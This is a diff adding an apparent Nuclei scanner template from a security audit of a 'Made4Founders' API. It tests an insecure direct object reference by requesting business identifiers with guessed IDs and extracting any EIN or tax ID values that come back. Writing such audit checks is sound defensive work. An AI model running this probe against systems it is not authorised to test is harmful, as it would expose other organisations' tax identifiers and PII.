@@ -1,0 +1,44 @@
+id: m4f-idor-business-identifiers
+
+info:
+  name: Made4Founders - Business Identifier IDOR
+  author: security-audit
+  severity: critical
+  description: Tests for IDOR in business identifiers - can expose EIN, Tax IDs across orgs
+  tags: idor,m4f,identifiers,pii
+
+http:
+  - raw:
+      - |
+        GET /api/business-identifiers/{{id}} HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{auth_token}}
+
+    payloads:
+      id:
+        - "1"
+        - "2"
+        - "3"
+        - "10"
+        - "100"
+
+    attack: pitchfork
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - '"value":'
+          - '"identifier_type":'
+        condition: and
+
+    extractors:
+      - type: json
+        json:
+          - '.value'
+          - '.identifier_type'
+        name: leaked_identifier
